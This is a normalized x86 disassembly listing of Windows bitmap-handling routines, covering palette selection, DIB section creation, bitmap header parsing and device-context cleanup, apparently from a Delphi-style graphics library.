mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4250b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_427760
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_4279a0
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4273ac
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_424e64
sub_4277e0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_4279a0
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42657c
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_42746c
sub_427828
push ebx
mov ebx eax
mov eax ebx
call sub_427990
mov eax ebx
call sub_4279a0
mov edx ebx
mov eax ebx
call sub_42746c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_42784c
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_4278cc
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_423458
mov eax ebx
call sub_42789c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_4277e0
xor edx edx
pop ecx
call sub_424aac
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_42791c
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_427b80
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_426944
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_4279a0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_41a988
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_427a23
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_427a40
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_427aea
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax ebx
call sub_427990
mov eax ebx
call sub_4279a0
mov eax edi
call sub_423458
mov ecx eax
mov esi [ ebx + 0x28 ]
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_42700c
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
xor ecx ecx
mov edx 0x54
call sub_402c84
lea eax [ ebp - 0x5c ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
call sub_426fa8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_427ce0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_427aef
mov eax [ ebp - 0x8 ]
call sub_422b88
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403a4c
call sub_403aa0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_427b20
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_427990
mov eax ebx
call sub_4279a0
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_4278cc
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_42700c
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_426500
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_427b80
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_4255fc
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_426500
push 0x0
call GetDC
call sub_424f0c
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_427c38
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_424de0
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_4273ac
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_427990
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402c84
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_427cbc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_41a968
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_428370
pop esi
pop ebx
retn
sub_427ce0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_427d67
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_403420
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_427dc7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_426774
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_426770
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427dce
push rw-data
call LeaveCriticalSection
retn
sub_427de0
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_428370
pop edx
pop edi
pop esi
pop ebx
retn
sub_427e08
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026f4
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_428325
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_4282f8
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402c84
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_424df8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41ac04
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402c84
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41ab94
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_42507c
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_42509c
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41ab94
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_424f0c
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_428273
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_425344
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026f4
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_4281db
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41ab94
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_424f0c
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4281af
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_4255fc
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40ca34
call sub_424df8
jmp r-xdata
xor eax eax
push ebp
push sub_428242
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41ab94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4281b6
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42827a
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40ca34
call sub_424df8
jmp r-xdata
sub_4281b6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_402714
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_42827a
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402c84
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_42830f
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_4255fc
mov [ ebp - 0x30 ] eax
sub_42832c
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_427ce0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_428370
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_427990
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41ab94
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402c84
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_427ce0
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_427e08
call sub_424df8
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_4283e0
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_427990
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402c84
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_426fa8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_42847b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_427ce0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4284a4
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_42784c
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_427990
mov eax esi
call sub_427b80
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_427990
mov eax esi
call sub_427b80
mov eax esi
call sub_42791c
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_426fa8
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_4273ac
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_427ce0
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_427ce0
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_426944
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4285dc
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4279a0
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_4273ac
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428630
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4279a0
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_4273ac
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4286b0
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_427990
mov eax ebx
call sub_4279a0
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_426944
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428747
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
